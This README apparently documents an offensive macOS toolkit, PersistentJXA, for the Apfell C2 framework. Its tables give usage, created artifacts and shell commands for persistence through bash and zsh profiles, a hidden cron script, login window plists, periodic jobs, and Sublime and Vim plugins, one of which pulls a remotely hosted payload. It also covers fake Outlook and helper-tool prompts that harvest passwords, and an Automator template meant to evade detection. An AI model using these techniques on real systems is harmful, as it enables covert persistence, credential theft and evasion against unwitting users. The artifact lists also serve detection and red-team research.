# PersistentJXA
Collection of macOS persistence methods and miscellaneous tools in JXA  <br />

# Usage
* In Apfell :

```JavaScript
jsimport (Selected file)
jsimport_call <NameOfPersistenceScript>(ScriptArguments)
```


| Project | Description | Usage | Artifacts Created | Commandline Commands Executed
| :------ | :---------- | :----------- | :----------- | :----------- |
| **BashProfile** |  Modifies user's bash profile to execute script if the persistence process (current implementation assumes osascript) is not already running. If Catalina system then .zshenv is modified. <br /> Persistence executes on terminal open. | js_importcall BashProfile('osascript -l JavaScript -e ...') |  $HOME/.security/apple.sh <br />  $HOME/.security/update.sh <br />  $HOME/.bash_profile or  $HOME/.zshenv| chmod +x $HOME/.security/apple.sh <br /> <br /> chmod +x $HOME/.security/persist.sh <br /> <br /> sh $HOME/.security/apple.sh <br /> <br /> sh $HOME/.security/persist.sh|
| **CronJobPersistence** | Persistence using CronJobs. This script will create a hidden file (share.sh) in the current user's Public/Drop Box folder. Writes a cron job with a default interval of 15mins which executes the hidden script.  <br />  (Note: This command generates a user prompt for Catalina. If the user clicks “Don’t Allow” the command should fail with an “operation not permitted"). <br /> Persistence executes every 15 mins. | js_importcall CronJobPersistence('osascript -l JavaScript -e ...') | $HOME/Public/Drop\ Box/.share.sh <br /> crontab entry | sh -c echo "$(echo '15 * * * * cd $HOME/Public/Drop\\ Box/ && ./.share.sh' ; crontab -l)" \| crontab - <br /> <br /> chmod +x "$HOME/Public/Drop\ Box/.share.sh  <br /> <br /> sh -c (Persistence Action)|
| **FinderSyncPlugins** |  Persistence using Finder Sync Extensions. Requires and app on the target to be setup for abuse. It searches the app for the required files and registers them. <br /> See https://objective-see.com/blog/blog_0x11.html for how to setup. <br />  Persistence executes on login.  |  js_importcall FinderSyncPlugins('/Users/Shared/SyncTest.app') | N/A | pluginkit -a </some/path/persist.appex> & <br /> <br /> pluginkit -e use -i <FinderSynsBundleID> & |
| **LoginScript** | **Requires Root** Modifies login window plist for persistence. Persistence executes on login. | js_importcall LoginScript('osascript -l JavaScript -e ...') | /var/root/Library/Preferences/com.apple.loginwindow.plist <br />  <br />/Users/Shared/.security/test.sh | chmod +x /Users/Shared/.security/test.sh & <br />  <br /> sh -c (Persistence Action) |
| **PeriodicPersist** | **Requires Root** Create a daily job in /etc/periodic/daily. Persistence executes  daily. | js_importcall PeriodicPersist('osascript -l JavaScript -e ...') | /etc/periodic/daily/111.clean-hist | chmod +x /etc/periodic/daily/111.clean-hist & <br />  <br /> sh -c (Persistence Action)|
| **SublimeTextAppScriptPersistence** | Persistence using the Sublime Text application script. Appends the application script for Sublime to execute our command.. <br /> Persistence executes upon Sublime opening. <br /> See https://theevilbit.github.io/posts/macos_persisting_through-application_script_files/ for more details.|js_importcall SublimeTextAppScriptPersistence('osascript -l JavaScript -e ...') | modification to end of /Applications//Sublime\ Text.app/Contents/MacOS/sublime.py | sh -c (Persistence Action) |
| **SublimeTextPluginPersistence** | Persistence using Sublime Text plugins. Creates a plugin file that is executed open the opening of Sublime. <br />  Persistence executes upon Sublime opening. | js_importcall SublimeTextPluginPersistence('/Users/Shared/inject.dylib')| $HOME/Library/Application\ Support/Sublime\ Text\  [2 or 3] /PrettyText/PrettyText.py  | N/A |
| **VimPluginPersistence** | Persistence using Vim plugins. Creates a plugin file that is executed open the opening of vim. <br />  Persistence executes upon vim opening. | js_importcall VimPluginPersistence('http://path/to/hosted/apfellpayload')  | $HOME/.vim/plugin/d.vim | sh -c (Persistence Action) |

# Misc Scripts / Tools

| Project | Description | Usage | Artifacts Created | Commandline Commands
| :------ | :---------- | :----------- | :----------- | :----------- |
| **DylibHijackScan** | JXA version of Patrick Wardle's tool that searches applications for dylib hijacking opportunities. May generate user pop up if looking into protected fodlers. Requires xcode installed on 10.14.1| js_importcall DylibHijackScan()  | N/A | "sh -c  lsof \| tr -s ' ' \| cut -d' ' -f9 \| sed '/^$/d' \| grep '^/'\| sort \| uniq" <br /> sh -c file "placeholder"  <br /> sh -c  otool -l "placeholder" <br /> |
| **PrivilegedHelperToolSpoof** | Tools searches the installed Privileged Helper Tools "/Library/PrivilegedHelperTools" and leverages legitimate icons and information in an attempt to gain user password credentials. The tool prompts again (with slightly different text) if the first password entry is blank. If no helper tool then default prompt for creds. | js_importcall PrivHelpToolSpoof() | N/A | sh -c launchctl plist __TEXT,__info_plist /Library/PrivilegedHelperTools/ <arrary> \| grep -A1 AuthorizedClients" |
| **OutlookUpdatePrompt** | Tool which prompts the user for and update in an attempt to gain password credentials. Attempts to bring a prompt using outlook icon if installed otherwise uses standard cog. Returns credentials from prompt entry to the user. | js_importcall OutlookUpdatePrompt() | N/A | N/A |
| **WorkflowTemplate** | A template for Automator to execute JXA. This is to evade simple detections on commandline osascript. After replacing the placeholder (JXA PAYLOAD HERE) with the desired js script, it can be executed by  /usr/bin/automator /path/to/file/Workflow.wflow. Requires the file to be on host but can be leveraged in combination with the above persistence methods | /usr/bin/automator /path/to/file/Workflow.wflow | /path/to/file/Workflow.wflow  | /usr/bin/automator /path/to/file/Workflow.wflow|
